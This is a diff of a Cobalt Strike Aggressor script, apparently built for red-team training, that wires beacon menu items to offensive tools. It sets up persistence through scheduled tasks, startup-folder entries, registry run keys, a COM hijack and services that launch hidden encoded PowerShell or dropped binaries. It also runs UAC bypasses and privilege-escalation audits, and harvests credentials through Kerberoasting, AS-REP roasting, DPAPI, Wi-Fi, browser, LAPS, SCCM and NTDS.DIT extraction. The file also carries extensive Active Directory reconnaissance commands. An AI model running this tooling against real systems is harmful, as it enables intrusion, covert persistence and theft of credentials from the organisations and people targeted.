@@ -7,6 +7,7 @@ inline print_error {
    println(formatDate("[HH:mm:ss] ") . "\c4[crto.cna]\o " . $1);
 }
 
+
 ## Global Variables
 global('$ip');
 
@@ -29,38 +30,30 @@ popup beacon_bottom
 				item "Group : user"
 				{
 					binput($1, "Seatbelt.exe -group=user");
-					bexecute_assembly($1, script_resource("C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release\\Seatbelt.exe"), " -group=user");
+					bexecute_assembly($1, "C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release\\Seatbelt.exe", " -group=user");
 				}
 				item "Group : system"
 				{
 					binput($1, "Seatbelt.exe -group=system");
-					bexecute_assembly($1, script_resource("C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release\\Seatbelt.exe"), " -group=system");
+					bexecute_assembly($1, "C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release\\Seatbelt.exe", " -group=system");
 				
 				}
 				item "Group : remote"
 				{
 					binput($1, "Seatbelt.exe -group=remote");
-					bexecute_assembly($1, script_resource("C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release\\Seatbelt.exe"), " -group=remote");
+					bexecute_assembly($1, "C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release\\Seatbelt.exe", " -group=remote");
 				}
 				item "Group : misc"
 				{
 					binput($1, "Seatbelt.exe -group=misc");
-					bexecute_assembly($1, script_resource("C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release\\Seatbelt.exe"), " -group=misc");
+					bexecute_assembly($1, "C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release\\Seatbelt.exe", " -group=misc");
 				}
 				item "Group : all"
 				{
 					binput($1, "Seatbelt.exe -group=all");
-					bexecute_assembly($1, script_resource("C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release\\Seatbelt.exe"), " -group=all");
+					bexecute_assembly($1, "C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release\\Seatbelt.exe", " -group=all");
 				}
 			}
-			# menu "winPEAS"
-			# {
-			# 	item "Run winPEAS.exe"
-			# 	{
-			# 		binput($1, "winPEAS.exe");
-			# 		bexecute_assembly($1, script_resource('Tools/winPEAS.exe'), "");
-			# 	}
-         #                }
 		}
 		menu "Host Persistence"
 		{
@@ -99,7 +92,7 @@ popup beacon_bottom
 
 					$ToExec ="-t schtask -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"-nop -w hidden -enc $PScommandBase64\" -n \"Updater\" -m add -o hourly";
 					binput($1, "execute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe $ToExec");
-					bexecute_assembly($1, script_resource('Tools/SharPersist.exe'), $ToExec);
+					bexecute_assembly($1, "C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe", $ToExec);
 				}
 				item "Exe HTTP x64"
 				{
@@ -121,7 +114,7 @@ popup beacon_bottom
 					
 					$ToExec ="-t schtask -c \"C:\\Windows\\Temp\\http_tsp.exe\" -n \"UpdaterBin\" -m add -o hourly";
 					binput($1, "execute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe $ToExec");
-					bexecute_assembly($1, script_resource('Tools/SharPersist.exe'), $ToExec);
+					bexecute_assembly($1, "C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe", $ToExec);
 				}
 			}
 			menu "Startup Folder"
@@ -143,7 +136,7 @@ popup beacon_bottom
 
 					$ToExec ="-t startupfolder -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"-nop -w hidden -enc $PScommandBase64\" -m add -f \"UserEnvSetup\"";
 					binput($1, "execute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe $ToExec");
-					bexecute_assembly($1, script_resource('Tools/SharPersist.exe'), $ToExec);
+					bexecute_assembly($1, "C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe", $ToExec);
 				}
 				item "Exe HTTP x64"
 				{
@@ -165,7 +158,7 @@ popup beacon_bottom
 					
 					$ToExec ="-t startupfolder -c \"C:\\Windows\\Temp\\http_sfp.exe\" -m add -f \"UserEnvSetupBin\"";
 					binput($1, "execute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe $ToExec");
-					bexecute_assembly($1, script_resource('Tools/SharPersist.exe'), $ToExec);
+					bexecute_assembly($1, "C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe", $ToExec);
 				}
 			}
 			menu "Registry AutoRun"
@@ -190,7 +183,7 @@ popup beacon_bottom
 					
 					$ToExec ="-t reg -c \"C:\\Windows\\Temp\\http_arp.exe\" -k \"hkcurun\" -v UpdaterBin -m add";
 					binput($1, "execute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe $ToExec");
-					bexecute_assembly($1, script_resource('Tools/SharPersist.exe'), $ToExec);
+					bexecute_assembly($1, "C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe", $ToExec);
 				}
 			}
 			menu "COM Hijacks"
@@ -215,7 +208,7 @@ popup beacon_bottom
 					
 					$ToExec ="-t reg -c \"C:\\Windows\\Temp\\http_arp.exe\" -a \"/q /n\" -k \"hkcurun\" -v UpdaterBin -m add";
 					binput($1, "execute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe $ToExec");
-					bexecute_assembly($1, script_resource('Tools/SharPersist.exe'), $ToExec);
+					bexecute_assembly($1, "C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe", $ToExec);
 					bpowerpick($1,"New-Item -Path \"HKCU:Software\\Classes\\CLSID\" -Name \"{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\"");
 					bpowerpick($1,"New-Item -Path \"HKCU:Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\" -Name \"InprocServer32\" -Value \"c:\\windows\\Temp\\http_com.dll\"");
 					bpowerpick($1,"New-ItemProperty -Path \"HKCU:Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\InprocServer32\" -Name \"ThreadingModel\" -Value \"Both\"");
@@ -243,7 +236,7 @@ popup beacon_bottom
 					
 					$ToExec ="-t service -c \"C:\\Windows\\Temp\\tcp_svc.exe\" -n \"legit-svc\" -m add";
 					binput($1, "execute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe $ToExec");
-					bexecute_assembly($1, script_resource('Tools/SharPersist.exe'), $ToExec);
+					bexecute_assembly($1, "C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe", $ToExec);
 				}
 				item "Svc DNS"
 				{
@@ -265,7 +258,7 @@ popup beacon_bottom
 					
 					$ToExec ="-t service -c \"C:\\Windows\\Temp\\tcp_svc.exe\" -n \"legit-svc\" -m add";
 					binput($1, "execute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe $ToExec");
-					bexecute_assembly($1, script_resource('Tools/SharPersist.exe'), $ToExec);
+					bexecute_assembly($1, "C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe", $ToExec);
 				}
 			}
 		}
@@ -275,18 +268,18 @@ popup beacon_bottom
 			item "SharpUp.exe audit"
 			{
 				binput($1, "SharpUp.exe audit");
-				bexecute_assembly($1, script_resource("C:\\Tools\\SharpUp\\SharpUp\\bin\\Release\\SharpUp.exe"), " audit");
+				bexecute_assembly($1, "C:\\Tools\\SharpUp\\SharpUp\\bin\\Release\\SharpUp.exe", " audit");
 			}
 			item "Unquoted Service Paths"
 			{
 				binput($1, "SharpUp.exe audit UnquotedServicePath");
-				bexecute_assembly($1, script_resource("C:\\Tools\\SharpUp\\SharpUp\\bin\\Release\\SharpUp.exe"), " audit UnquotedServicePath");
+				bexecute_assembly($1, "C:\\Tools\\SharpUp\\SharpUp\\bin\\Release\\SharpUp.exe", " audit UnquotedServicePath");
 			}
 			item "Weak Service Binary Permissions"
 			{
 				binput($1, "SharpUp.exe audit ModifiableServices");
-				bexecute_assembly($1, script_resource("C:\\Tools\\SharpUp\\SharpUp\\bin\\Release\\SharpUp.exe"), " audit ModifiableServices");
-			
+				bexecute_assembly($1, "C:\\Tools\\SharpUp\\SharpUp\\bin\\Release\\SharpUp.exe", " audit ModifiableServices");
+			}
 			menu "UAC Bypasses"
 			{
 				item "Elevate Kit Bind TCP Local x64"
@@ -378,12 +371,12 @@ popup beacon_bottom
 				
 	            item "Kerberos Tickets list"
 	            {
-	                bexecute_assembly($1, script_resource("C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe"), "triage");
+	                bexecute_assembly($1, "C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe", "triage");
 	            }
 	
 	            item "Wifi password"
 	            {
-	                bexecute_assembly($1, script_resource("Tools/SharpWifiDump.exe"), " ");
+	                bexecute_assembly($1, script_resource('Tools/SharpWifiDump.exe'), " ");
 	            }
 	
 	            item "Password in registry (Machine)"
@@ -398,7 +391,7 @@ popup beacon_bottom
 	
 	            item "SharpWeb"
 	            {
-	                bexecute_assembly($1, script_resource("Tools/SharpWeb.exe"), " all");
+	                bexecute_assembly($1, script_resource('Tools/SharpWeb.exe'), " all");
 	            }
 
  		   item "Extract NTDS.DIT"
@@ -416,21 +409,21 @@ popup beacon_bottom
 	    {
 	        item "Domain information"
 	        {
-			    bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+			    bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, ' Get-Domain');
 	            bpowershell_import_clear($1);
 	        }
 	
 	        item "Domain Controller"
 	        {
-			    bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+			    bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, ' Get-DomainController');
 	            bpowershell_import_clear($1);
 	        }
 	
 	        item "Trust information"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, ' Get-DomainTrust');
 	            bpowershell_import_clear($1);
 	
@@ -438,14 +431,14 @@ popup beacon_bottom
 	
 	        item "User list"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, ' Get-DomainUser -Properties DisplayName, MemberOf | fl');
 	            bpowershell_import_clear($1);
 	        }
 	
 	        item "Computer list"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, ' Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName');
 	            bpowershell_import_clear($1);
 	        }
@@ -453,50 +446,52 @@ popup beacon_bottom
 	
 	        item "Group list"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, ' Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName');
 	            bpowershell_import_clear($1);
 	        }
 	
 	        item "GPO list"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, ' Get-DomainGPO -Properties DisplayName | sort -Property DisplayName');
 	            bpowershell_import_clear($1);
 	        }
 	
 	        item "GPO Local Group"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, ' Get-DomainGPOLocalGroup | select GPODisplayName, GroupName');
 	            bpowershell_import_clear($1);
 	        }
 	
 	        item "GPO with modification rights"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, ' $sid=Get-DomainSID ; Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match $sid+"-[\d]{4,10}" }');
 	            bpowershell_import_clear($1);
 	        }
 	
 	        item "OU list"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, ' Get-DomainOU -Properties Name | sort -Property Name');
 	            bpowershell_import_clear($1);
 	        }
 	
+	
 	        item "MSSQL Local Instance"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerUpSQL\\PowerUpSQL.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerUpSQL\\PowerUpSQL.ps1");
 	            bpowerpick($1, ' Get-SQLInstanceLocal -Verbose');
 	            bpowershell_import_clear($1);
 	
 	        }
-	        	
+	
+	
 	        item "MSSQL Domain Instance"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerUpSQL\\PowerUpSQL.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerUpSQL\\PowerUpSQL.ps1");
 	            bpowerpick($1, ' Get-SQLInstanceDomain -Verbose');
 	            bpowershell_import_clear($1);
 	
@@ -504,38 +499,38 @@ popup beacon_bottom
 	
 	        item "Kerberoastable user"
 	        {
-	            bexecute_assembly($1, script_resource("C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe"), "kerberoast /nowrap");
+	            bexecute_assembly($1, "C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe", "kerberoast /nowrap");
 	        }
 	
 	        item "Asreprostable user"
 	        {
-	            bexecute_assembly($1, script_resource("C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe"), "asreproast /nowrap");
+	            bexecute_assembly($1, "C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe", "asreproast /nowrap");
 	        }
 	
 	        item "Logged on"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, ' Get-DomainComputer | Get-NetLoggedon');
 	            bpowershell_import_clear($1);
 	        }
 	
 	        item "Net session"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, ' Get-DomainComputer | Get-NetSession');
 	            bpowershell_import_clear($1);
 	        }
 	
 	        item "RDP Session"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, ' Get-DomainComputer | Get-NetRDPSession');
 	            bpowershell_import_clear($1);
 	        }
 	
 	        item "DFS Share"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, ' Get-DomainDFSShare');
 	            bpowershell_import_clear($1);
 	
@@ -543,49 +538,49 @@ popup beacon_bottom
 	
 	        item "Net share"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, ' Get-DomainComputer | Get-NetShare');
 	            bpowershell_import_clear($1);
 	        }
 	
 	        item "Share finder"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, 'Find-DomainShare -CheckShareAccess');
 	            bpowershell_import_clear($1);
 	        }
 	
 	        item "Search *.doc*, *.xls*, *.csv, *.ppt*, *.pdf, *.sql in shares"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, 'Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*, *.pdf, *.sql');
 	            bpowershell_import_clear($1);
 	        }
 	
 	        item "Search Unconstrained deleguation"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, ' Get-DomainComputer -UnConstrained | select samaccountname, dnshostname');
 	            bpowershell_import_clear($1);
 	        }
 	
 	        item "Search deleguation (user)"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, ' Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto');
 	            bpowershell_import_clear($1);
 	        }
 	
 	        item "Search deleguation (computer)"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, ' Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto');
 	            bpowershell_import_clear($1);
 	        }
 	
 	        item "DNS Record"
 	        {
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 	            bpowerpick($1, ' Get-DomainDNSZone | Get-DomainDNSRecord | select name');
 	            bpowershell_import_clear($1);
 	        }
@@ -600,7 +595,7 @@ popup beacon_bottom
 	        item "Credential Manager"
 	        {
 			binput($1, "Seatbelt.exe WindowsCredentialFiles");
-			bexecute_assembly($1, script_resource("C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release\\Seatbelt.exe"), "WindowsCredentialFiles");
+			bexecute_assembly($1, "C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release\\Seatbelt.exe", "WindowsCredentialFiles");
 	        }
 		item "List Master keys files"
 		{
@@ -613,7 +608,7 @@ popup beacon_bottom
 		item "SharpDPAPI machinetriage (admin)"
 		{
 			binput($1, "SharpDPAPI.exe machinetriage /showall");
-			bexecute_assembly($1, script_resource("C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release\\SharpDPAPI.exe"), "machinetriage /showall");
+			bexecute_assembly($1, "C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release\\SharpDPAPI.exe", "machinetriage /showall");
 		}
 	        item "Get Master Key cached (admin)"
 	        {
@@ -634,12 +629,12 @@ popup beacon_bottom
 	        item "Finding Certificate Authorities"
 	        {
 				binput($1, "Certify.exe cas");
-				bexecute_assembly($1, script_resource("C:\\Tools\\Certify\\Certify\\bin\\Release"), "cas");
+				bexecute_assembly($1, "C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe", "cas");
 	        }
 	        item "Misconfigured Certificate Templates"
 	        {
 				binput($1, "Certify.exe find /vulnerable");
-				bexecute_assembly($1, script_resource("C:\\Tools\\Certify\\Certify\\bin\\Release"), "find /vulnerable");
+				bexecute_assembly($1, "C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe", "find /vulnerable");
 	        }
 		}
 		menu "Microsoft Configuration Manager"
@@ -647,7 +642,7 @@ popup beacon_bottom
 	        item "Finding SCCM Servers (SharpSCCM)"
 	        {
 				binput($1, "SharpSCCM.exe local site-info --no-banner");
-				bexecute_assembly($1, script_resource("C:\\Tools\\SharpSCCM\\bin\\Release\\SharpSCCM.exe"), "local site-info --no-banner");
+				bexecute_assembly($1, "C:\\Tools\\SharpSCCM\\bin\\Release\\SharpSCCM.exe", "local site-info --no-banner");
 	        }
 	        item "Finding SCCM Servers (WMI)"
 	        {
@@ -657,17 +652,17 @@ popup beacon_bottom
 	        item "NAC Credentials (admin)"
 	        {
 				binput($1, "SharpSCCM.exe local naa -m wmi --no-banner");
-				bexecute_assembly($1, script_resource("C:\\Tools\\SharpSCCM\\bin\\Release\\SharpSCCM.exe"), "local naa -m wmi --no-banner");
+				bexecute_assembly($1, "C:\\Tools\\SharpSCCM\\bin\\Release\\SharpSCCM.exe", "local naa -m wmi --no-banner");
 	        }
 	        item "Get SCCM Collections for current user"
 	        {
 				binput($1, "SharpSCCM.exe get collections --no-banner");
-				bexecute_assembly($1, script_resource("C:\\Tools\\SharpSCCM\\bin\\Release\\SharpSCCM.exe"), "get collections --no-banner");
+				bexecute_assembly($1, "C:\\Tools\\SharpSCCM\\bin\\Release\\SharpSCCM.exe", "get collections --no-banner");
 	        }
 	        item "Get SCCM User rights"
 	        {
 				binput($1, "SharpSCCM.exe get class-instances SMS_Admin --no-banner");
-				bexecute_assembly($1, script_resource("C:\\Tools\\SharpSCCM\\bin\\Release\\SharpSCCM.exe"), "get class-instances SMS_Admin --no-banner");
+				bexecute_assembly($1, "C:\\Tools\\SharpSCCM\\bin\\Release\\SharpSCCM.exe", "get class-instances SMS_Admin --no-banner");
 	        }
 		}
 		menu "LAPS"
@@ -680,28 +675,28 @@ popup beacon_bottom
 	        item "Search GPO with LAPS in name"
 	        {
 				binput($1, "Get-DomainGPO | ? { \$_.DisplayName -like \"*laps*\" } | select DisplayName, Name, GPCFileSysPath | fl");
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 				bpowerpick($1, "Get-DomainGPO | ? { \$_.DisplayName -like \"*laps*\" } | select DisplayName, Name, GPCFileSysPath | fl");
 	            bpowershell_import_clear($1);
 	        }
 	        item "List computer with ms-Mcs-AdmPwdExpirationTime not null"
 	        {
 				binput($1, "Get-DomainComputer | ? { \$_.\"ms-Mcs-AdmPwdExpirationTime\" -ne \$null } | select dnsHostName");
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 				bpowerpick($1, "Get-DomainComputer | ? { \$_.\"ms-Mcs-AdmPwdExpirationTime\" -ne \$null } | select dnsHostName");
 	            bpowershell_import_clear($1);
 	        }
 	        item "List who is allowed to read LAPS password (PowerView)"
 	        {
 				binput($1, "Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { \$_.ObjectAceType -eq \"ms-Mcs-AdmPwd\" -and \$_.ActiveDirectoryRights -match \"ReadProperty\" } | select ObjectDn, SecurityIdentifier | fl");
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 				bpowerpick($1, "Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { \$_.ObjectAceType -eq \"ms-Mcs-AdmPwd\" -and \$_.ActiveDirectoryRights -match \"ReadProperty\" } | select ObjectDn, SecurityIdentifier | fl");
 	            bpowershell_import_clear($1);
 	        }
 	        item "List who is allowed to read LAPS password (LAPSToolkit)"
 	        {
 				binput($1, "Find-LAPSDelegatedGroups");
-	            bpowershell_import($1, script_resource("C:\Tools\\LAPSToolkit\\LAPSToolkit.ps1"));
+	            bpowershell_import($1, "C:\Tools\\LAPSToolkit\\LAPSToolkit.ps1");
 	            bpowerpick($1, 'Find-LAPSDelegatedGroups');
 	            bpowershell_import_clear($1);
 	        }
@@ -711,20 +706,12 @@ popup beacon_bottom
 	        item "Search GPO with AppLocker in name"
 	        {
 				binput($1, "Get-DomainGPO -Domain dev-studio.com | ? { \$_.DisplayName -like \"*AppLocker*\" } | select displayname, gpcfilesyspath");
-	            bpowershell_import($1, script_resource("C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1"));
+	            bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
 				bpowerpick($1, "Get-DomainGPO -Domain dev-studio.com | ? { \$_.DisplayName -like \"*AppLocker*\" } | select displayname, gpcfilesyspath");
 	            bpowershell_import_clear($1);
 	        }
 		}
 	}
-}
-
-## Generate Payload
-sub generate_my_payload {					
-	$outfile = getFileProper(script_resource("Payloads"), $2);
-	$handle = openf("> $outfile");
-	writeb($handle, $1);
-	closef($handle);
 }
 
 ## DPAPI functions
